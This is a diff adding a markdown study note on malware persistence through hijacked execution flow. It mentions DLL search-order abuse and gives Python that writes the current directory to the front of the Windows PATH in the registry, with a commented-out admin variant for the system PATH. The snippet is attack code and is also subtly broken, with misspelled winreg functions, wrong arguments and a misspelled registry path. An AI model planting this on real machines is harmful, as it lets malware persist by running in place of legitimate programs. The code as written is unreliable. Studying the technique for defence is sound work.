@@ -1,0 +1,49 @@
+# Hijack Execution Flow
+
+- Malware can achieve persistence by causing it
+to be run instead of legitimate system
+processes.
+- This can be accomplished in a number of
+different ways
+    
+    — Changing system path
+    — Exploiting DLL search order
+    
+    ![Untitled](Hijack%20Execution%20Flow%2081a5932ca9ae4604b20d3a8a6b1ed9a7/Untitled.png)
+    
+    ### Modify the system paths to insert path for exe in a path of exesting exe
+    
+    ### **Enviroment variables**
+    
+    ```python
+    import os, winreg
+    def readPathVa1ue (reghive , regpath) :
+        reg = winreg.ConnectRegistry(None , reghive)
+        key = winreg.OpenKey (reg , winreg.KEY_READ)
+        index = 0
+        while True:
+            val  = winreg.EnumVa1ue (key, index)
+            if val[0] == "Path":
+                return val[1]
+            index +=1
+    
+    def editPathVa1ue (reghive , regpath, targetdir) :
+        path = readPathVa1ue(reghive, regpath)
+        newpath = targetdir + ";" + path
+        reg = winreg.ConnectRegistry(None, regpath)
+        key = winreg.OpenKey(reg , regpath , access = winreg.KEY_SET_VALUE)
+        winreg.setValueEx(key, "path", 0 , winreg.REG_EXPAND_SZ, newpath)
+    
+    # Modify user path
+    reghive = winreg.HKEY_CURRENT_USER
+    regpath = "Environment"
+    targetdir = os.getcwd()
+    
+    editPathVa1ue(reghive,regpath,targetdir)
+    
+    # Modify system path NEED Admin level on windows
+    # reghive = winreg.HKEY_LOCAL_MACHINE
+    # regpath = "SYSTEM\CurrentContrlSet\Control\Session Manger\Environment"
+    # targetdir = os.getcwd()
+    # editPathVa1ue(reghive,regpath,targetdir)
+    ```
